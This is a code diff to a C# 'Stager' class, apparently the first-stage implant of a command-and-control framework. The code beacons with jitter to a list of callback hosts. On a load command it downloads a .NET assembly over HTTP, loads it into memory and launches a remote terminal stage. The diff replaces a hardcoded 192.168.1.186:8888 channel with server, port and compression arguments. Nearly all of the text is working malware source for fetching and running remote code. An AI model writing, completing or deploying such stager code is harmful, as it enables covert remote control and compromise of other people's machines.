@@ -21,9 +21,9 @@ namespace Stager
         int beacon, jitter;
         Thread mainThread;
         /// <summary>
-        /// 
+        /// Creates a new StageZero object that calls back to hosts in the uriFile.
         /// </summary>
-        /// <param name="uriFile"></param>
+        /// <param name="uriFile">List of addresses to initially callback to</param>
         public StageZero(FileInfo uriFile, int beacon, int jitter)
         {
             commandUriList = new List<Uri>();
@@ -68,12 +68,13 @@ namespace Stager
         /// This method loads the assembly into the running process
         /// </summary>
         /// <param name="assembly">The assembly to load into memory as a byte array</param>
+        /// <param name="arguments">Arguments to use for the assembly to be loaded</param>
         /// <returns>
         /// -1 - byte array is not loaded correctly
         /// 0 - Bad assembly format
         /// 1 - Success
         /// </returns>
-        public int LoadStage(byte[] assembly)
+        public int LoadStage(byte[] assembly, Dictionary<string, string> arguments)
         {
             Assembly s = Assembly.Load(assembly);
             foreach(var type in s.GetTypes())
@@ -81,7 +82,10 @@ namespace Stager
                 if (type.FullName.Equals("Reno.Stages.Terminal"))
                 {
                     Assembly a = Assembly.Load(assembly);
-                    ClearChannel channel = new ClearChannel("192.168.1.186", 8888, "GZIP");
+                    string server = arguments["server"];
+                    int port = Int32.Parse(arguments["port"]);
+                    string compression = arguments["compression"];
+                    ClearChannel channel = new ClearChannel(server, port, compression);
                     object[] p = new object[1];
                     p[0] = channel;
                     var terminalInstance = Activator.CreateInstance(type, p);
@@ -255,8 +259,9 @@ namespace Stager
         /// <param name="site">The site to connect to</param>
         /// <returns>StagerResult - contains the result of the request (found the item, didn't find the item) 
         /// and the new stage if it was able to download</returns>
-        public async void RequestStage(Uri site)
+        public async Task<byte[]> RequestStage(Uri site)
         {
+            byte[] assembly = { 0 };
             StagerCommand result = new StagerCommand();   // Store all the information in this
             HttpClientHandler handler = new HttpClientHandler();
             HttpClient client = new HttpClient(handler);
@@ -271,29 +276,27 @@ namespace Stager
                 HttpContentHeaders contentHeaders = response.Content.Headers;
                 string contentType = contentHeaders.ContentType.MediaType;
                 long contentLength = contentHeaders.ContentLength ?? 0;     // ContentLength returns long?, so we need to check for null with ??. If null, just return 0;
-                if(contentLength > 0)
+                if (contentLength > 0)
                 {
 #if DEBUG
                     Console.WriteLine("[*] Downloading assembly");
 #endif
-                    byte[] assembly = new byte[contentLength];
+                    assembly = new byte[contentLength];
                     assembly = await response.Content.ReadAsByteArrayAsync();
-                    LoadStage(assembly);
+
                 }
             }
             catch (HttpRequestException e)
             {
                 Console.WriteLine("\n[-] Error opening assembly from source: " + e.Message);
             }
+            return assembly;
         }
 
-        public void Run()
+        public async void Run()
         {
             while (true)
             {
-#if DEBUG 
-                Console.WriteLine("\n[*] In Run");    
-#endif    
                 Random rand = new Random((int)DateTimeOffset.Now.ToUnixTimeMilliseconds()); // Pause for the amount of time required
                 int randomJitter = rand.Next(jitter);
                 int trueJitter;
@@ -346,7 +349,8 @@ namespace Stager
                             break;
                         case Command.Load:
                             Console.WriteLine("[*] Load Command");
-                            RequestStage(result.Uris[0]);   // Expected Uri count for a load command is 1
+                            byte[] assembly = RequestStage(result.Uris[0]).Result;   // Expected Uri count for a load command is 1
+                            LoadStage(assembly, result.Arguments);
                             break;
                         case Command.Remove:
                             Console.WriteLine("[*] Remove Command");
